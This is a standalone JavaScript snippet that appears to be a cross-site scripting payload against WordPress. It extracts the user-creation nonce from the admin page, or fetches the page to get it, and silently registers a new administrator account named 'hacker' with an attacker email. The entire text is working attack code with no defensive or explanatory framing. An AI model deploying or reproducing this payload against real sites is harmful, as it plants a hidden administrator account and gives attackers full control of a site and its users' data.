(function(){
  function create(n){
    fetch('/wp-admin/user-new.php', {
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'action=createuser&_wpnonce_create-user='+n+
           '&_wp_http_referer=%2Fwp-admin%2Fuser-new.php'+
           '&user_login=hacker'+
           '&email=hacker%40mail.com'+
           '&role=administrator'+
           '&noconfirmation=1'+
           '&createuser=Add+User'
    });
  }

  let n = document.querySelector('[name=_wpnonce_create-user]')?.value;
  if(n){
    create(n);
  } else {
    fetch('/wp-admin/user-new.php')
      .then(r=>r.text())
      .then(t=>{
        let m = t.match(/name="_wpnonce_create-user" value="([^"]+)"/);
        if(m) create(m[1]);
      });
  }
})();
